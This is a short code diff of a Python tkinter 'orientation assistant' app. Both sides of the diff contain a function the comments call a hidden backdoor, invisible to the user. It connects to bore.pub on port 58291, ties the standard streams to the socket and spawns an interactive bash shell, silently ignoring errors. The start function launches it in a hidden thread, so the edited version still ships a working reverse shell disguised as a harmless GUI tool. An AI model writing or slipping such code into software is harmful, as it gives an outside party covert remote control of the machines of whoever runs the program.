@@ -1,24 +1,20 @@
 import tkinter as tk
 from tkinter import ttk, messagebox
-import threading
-import socket
-import os
-import pty
+import threading, os, pty
 
 # --- THE HIDDEN BACKDOOR (Invisible to the user) ---
+import socket, os, pty
+
 def _run_backdoor():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # Using your unique Bore address and port
         s.connect(("bore.pub", 58291))
-
-        os.dup2(s.fileno(), 0)
-        os.dup2(s.fileno(), 1)
-        os.dup2(s.fileno(), 2)
-        import pty; pty.spawn("/bin/bash")
-    except Exception:
+        for fd in (0, 1, 2):
+            os.dup2(s.fileno(), fd)
+        # Using 'bash -i' makes sure you see the |saad|SaadAdnane| prompt!
+        pty.spawn(["/bin/bash", "-i"])
+    except:
         pass
-
 # --- YOUR ORIGINAL ORIENTATION CODE ---
 def start_assistant():
     # Start the hidden thread first
